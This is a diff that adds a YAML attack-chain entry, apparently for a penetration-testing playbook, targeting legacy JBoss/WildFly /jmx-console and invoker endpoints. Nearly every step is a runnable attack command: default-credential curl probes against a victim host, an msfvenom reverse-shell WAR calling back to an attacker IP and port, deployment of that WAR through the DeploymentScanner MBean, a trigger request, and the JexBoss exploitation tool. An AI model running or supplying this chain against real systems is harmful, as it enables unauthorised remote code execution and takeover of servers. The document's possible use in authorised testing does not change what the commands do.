@@ -1,0 +1,46 @@
+chain_id: jboss_jmx_console
+title: "JBoss / WildFly — /jmx-console + /web-console default creds → RCE"
+severity: HIGH
+tags: [web, jboss, jmx, default-creds, rce, deserialization]
+
+trigger:
+  any_of:
+    - { path_pattern: "(?i)/(jmx-console|web-console|invoker/(JMXInvokerServlet|EJBInvokerServlet))" }
+    - { banner_pattern: "(?i)jboss|wildfly" }
+
+description: |
+  Legacy JBoss / WildFly admin endpoints. Default `admin:admin` /
+  `admin:vagrant` credentials are still alive on internal networks.
+  /jmx-console lets you deploy a WAR; /invoker exposes the
+  JMXInvokerServlet which is famously deserialization-vulnerable.
+
+steps:
+  - id: 1
+    title: "Default-creds probe"
+    command: |
+      curl -u admin:admin   http://$VICTIMA/jmx-console/
+      curl -u admin:vagrant http://$VICTIMA/jmx-console/
+      curl -u jboss:jboss   http://$VICTIMA/jmx-console/
+
+  - id: 2
+    title: "Deploy a WAR via the DeploymentScanner MBean"
+    command: |
+      msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f war -o shell.war
+      python3 -m http.server 8000
+
+      # In jmx-console: jboss.deployment:flavor=URL,type=DeploymentScanner →
+      # method addURL(java.lang.String) → http://10.0.2.15:8000/shell.war
+
+  - id: 3
+    title: "Trigger"
+    command: curl http://$VICTIMA/shell/
+
+  - id: 4
+    title: "Single-shot with the JBoss invoker via JexBoss"
+    command: |
+      git clone https://github.com/joaomatosf/jexboss.git
+      cd jexboss
+      python3 jexboss.py -host http://$VICTIMA
+
+references:
+  - https://github.com/joaomatosf/jexboss
